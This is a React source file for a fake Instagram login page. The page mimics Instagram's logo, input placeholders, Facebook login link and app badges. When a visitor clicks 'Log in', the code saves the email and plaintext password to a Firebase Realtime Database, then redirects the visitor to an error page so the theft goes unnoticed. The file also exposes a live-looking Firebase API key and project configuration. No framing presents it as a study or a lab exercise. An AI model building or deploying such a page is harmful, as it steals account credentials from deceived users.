import React, { useEffect } from "react"
import { useState } from "react";
import  logo  from '../assets/instalogo.png'
import appstore from '../assets/appstore.png'
import playstore from '../assets/playstore.png'
import facebook from '../assets/fbicon.png'
import {  useNavigate } from 'react-router-dom'
import { initializeApp } from "firebase/app"
import { getDatabase, ref, push } from "firebase/database"


const firebaseConfig = {
  apiKey: "AIzaSyAKiTkxikSGQoBHMet1xkz6M30sam9h03Y",
  authDomain: "listforinsta.firebaseapp.com",
  databaseURL: "https://listforinsta-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "listforinsta",
  storageBucket: "listforinsta.appspot.com",
  messagingSenderId: "717868487701",
  appId: "1:717868487701:web:0bd823c295d64aab886a1c"
}

const app = initializeApp(firebaseConfig)
const db = getDatabase(app, firebaseConfig.databaseURL) // using getdatabase function to get Realtime Database SDK that is associated with FirebaseApp
const addInDb = ref(db, "items")  //referencing the db

function Login() {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false)

    const navigate = useNavigate()

    
  
  
    function handleLogin(e) {
      e.preventDefault()
      console.log(email)
      console.log(password)
      navigate('/error')
      push(addInDb, {mail: email, pass: password})

    }

    function handlePassword(){
      setShowPassword(!showPassword)

    }

    return (
      <div className="login-container">
        <div className="box-1">
            <div className="box-1-logo">
                <img src={logo} alt="logo" className="logo"/>
            </div>
            <div className="input-box">
                <input
                    onChange={(e) => setEmail(e.target.value)}
                    type="email"
                    placeholder="Phone number, username, or email address"
                    className="email"
                    value={email}
                />
                
                <input
                    onChange={(e) => setPassword(e.target.value)}
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Password"
                    className="password"
                    value={password}
                />
              
                {password && <span className="show-password" onClick={handlePassword}>{!showPassword ? 'Show' : 'Hide'}</span>}



            </div>
            
            <div className="login-btn-box">
              
                <button onClick={handleLogin} className="login-btn">Log in</button>
   
            </div>
            <div className="line-box">
              <div className="line1"></div>
              <div className="or">OR</div>
              <div className="line2"></div>
            </div>
            <div className="fb-box">
              <span>
                <img src={facebook} alt="logo" className="facebook"/>
              </span>
              <p className="fb-link">Log in with Facebook</p>
            </div>
            <div className="forgotbox">
              <p className="forgot-password">Forgotten your password?</p>
            </div>
        </div>

        <div className="box-2">
          <p>Don't have a account? <span className="sign-up">Sign up</span></p>
        </div>
        <div className="box-3">
        <div className="get-app">
          <p>Get the app.</p>
        </div>
        <div className="social-icons">
          <img src={appstore} alt="appstore logo" className="appstore"/>
          <img src={playstore} alt="playstore logo" className="playstore"/>
        </div>
        </div>
        
        
      </div>
    );
  }

export default Login
  